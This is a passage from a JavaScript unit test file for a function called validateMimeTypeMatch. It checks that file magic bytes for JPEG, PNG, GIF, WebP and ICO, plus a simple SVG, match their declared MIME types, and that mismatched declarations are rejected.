      const jpegBytes = [
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
      ];
      const file = createFileFromBytes(jpegBytes, 'test.jpg', 'image/jpeg');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return true when PNG content matches declared MIME type', async () => {
      const pngBytes = [
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
      ];
      const file = createFileFromBytes(pngBytes, 'test.png', 'image/png');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return true when GIF content matches declared MIME type', async () => {
      const gifBytes = [
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
        0x0A, 0x00, 0x0A, 0x00, 0xF7, 0x00, 0x00,
      ];
      const file = createFileFromBytes(gifBytes, 'test.gif', 'image/gif');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return true when WebP content matches declared MIME type', async () => {
      const webpBytes = [
        0x52, 0x49, 0x46, 0x46,
        0x24, 0x00, 0x00, 0x00,
        0x57, 0x45, 0x42, 0x50,
        0x56, 0x50, 0x38, 0x20,
      ];
      const file = createFileFromBytes(webpBytes, 'test.webp', 'image/webp');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return true when ICO content matches declared MIME type', async () => {
      const icoBytes = [
        0x00, 0x00, 0x01, 0x00,
        0x01, 0x00, 0x10, 0x10,
        0x00, 0x00, 0x01, 0x00, 0x08, 0x00,
      ];
      const file = createFileFromBytes(icoBytes, 'favicon.ico', 'image/x-icon');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return true when SVG content matches declared MIME type', async () => {
      const svgContent = `<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="40" />
</svg>`;
      const file = createTextFile(svgContent, 'test.svg', 'image/svg+xml');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(true);
    });

    it('should return false when JPEG content has wrong declared MIME type', async () => {
      const jpegBytes = [
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x01, 0x00, 0x48,
      ];
      // Arquivo JPEG real declarado como PNG
      const file = createFileFromBytes(jpegBytes, 'fake.png', 'image/png');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(false);
    });

    it('should return false when PNG content has wrong declared MIME type', async () => {
      const pngBytes = [
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
      ];
      // Arquivo PNG real declarado como JPEG
      const file = createFileFromBytes(pngBytes, 'fake.jpg', 'image/jpeg');

      const isValid = await validateMimeTypeMatch(file);

      expect(isValid).toBe(false);
    });
  });
});
